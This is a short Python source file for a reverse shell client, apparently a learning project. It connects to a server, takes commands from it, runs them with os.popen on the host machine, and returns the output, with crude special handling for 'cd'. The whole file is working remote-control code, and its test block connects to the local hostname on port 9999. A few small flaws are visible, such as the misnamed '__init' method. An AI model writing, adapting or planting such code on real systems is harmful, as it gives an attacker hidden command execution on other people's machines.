import os
from client import *


class ClientReverseShell(Client):
    def __init(self,server_ip,server_port):
        super().__init__(server_ip,server_port)

    def exec_command(self):
        #getting the command from the server
        comm = self.recv_data()
        #executing the command on the client machine(the machine on which this script will run)
        if "cd" == comm.strip()[:2]:
            dir = comm[comm.index('d')+1:]
            os.chdir(dir)
            self.send_data(f"directory has been changed to {os.popen('pwd').read()}")
        else:
            exec_comm = os.popen(comm)
            #sending the command response back to the server
            self.send_data(exec_comm.read())

#testing the reverse shell client
if __name__ == "__main__":
    client = ClientReverseShell(socket.gethostname(),9999)
    while True:
        client.exec_command()
